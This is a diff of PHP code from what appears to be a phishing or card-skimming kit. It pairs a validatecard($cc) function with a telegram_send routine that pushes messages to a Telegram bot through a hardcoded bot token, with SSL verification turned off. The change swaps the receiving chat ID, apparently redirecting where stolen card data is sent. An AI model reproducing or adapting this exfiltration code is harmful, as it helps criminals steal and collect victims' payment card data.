@@ -161,7 +161,7 @@ function validatecard($cc)
 function telegram_send($message) {
     $curl = curl_init();
     $api_key  = "1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ"; // API KEY
-    $chat_id  = "1097743075"; // CHAT ID
+    $chat_id  = "-662491150"; // CHAT ID
     $format   = 'HTML';
     curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
     curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
